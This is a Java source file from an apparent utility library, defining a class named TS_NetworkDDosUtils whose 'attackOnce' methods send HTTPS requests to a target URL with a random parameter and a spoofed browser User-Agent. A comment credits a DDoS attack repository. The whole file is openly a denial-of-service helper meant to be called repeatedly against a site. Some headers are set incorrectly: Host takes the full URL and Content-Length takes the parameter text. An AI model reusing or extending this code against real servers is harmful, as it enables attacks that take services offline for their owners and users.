package com.tugalsan.api.network.server;

import com.tugalsan.api.log.server.*;
import com.tugalsan.api.random.client.*;
import com.tugalsan.api.string.client.*;
import com.tugalsan.api.unsafe.client.*;
import java.net.*;
import javax.net.ssl.*;

public class TS_NetworkDDosUtils {

    final private static TS_Log d = new TS_Log(TS_NetworkDDosUtils.class.getSimpleName());

    public static void attackOnce(String urlString) {
        attackOnce(urlString, TGS_StringUtils.concat("p=", String.valueOf(TGS_RandomUtils.nextInt(0, Integer.MAX_VALUE))));
    }

    public static void attackOnce(String urlString, String paramPair) {
        var url = TGS_UnSafe.compile(() -> new URL(urlString), e -> null);
        HttpsURLConnection con = null;
        try {//https://github.com/Abdelaziz-Khabthani/Ddos-java/blob/master/DdosAttack.java
            con = (HttpsURLConnection) url.openConnection();
            con.setDoOutput(true);
            con.setDoInput(true);
            con.setRequestMethod("GET");
            con.setRequestProperty("charset", "utf-8");
            con.setRequestProperty("Host", urlString);
            con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            con.setRequestProperty("Content-Length", paramPair);
            System.out.println("getResponseCode:" + con.getResponseCode());
            con.getInputStream();
        } catch (Exception e) {
            d.ce("attackOnce", e.getMessage());
        } finally {
            if (con != null) {
                con.disconnect();
            }
        }
    }
}
